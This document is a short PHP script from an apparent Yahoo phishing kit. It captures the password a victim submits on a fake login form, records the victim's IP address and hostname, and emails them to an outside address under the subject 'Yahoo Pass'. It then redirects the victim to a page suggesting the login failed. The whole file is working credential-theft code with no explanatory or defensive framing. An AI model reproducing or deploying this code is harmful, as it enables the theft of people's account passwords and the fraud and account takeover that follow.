<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Password               : ".$_POST['password']."\n";

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@com-singapore.us";
$bilsub = "Yahoo Pass | From $ip";
$bilhead = "From:Pass Masuk <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../failed-message=none&.src=fp.html";
header("location:$src");
?>
?>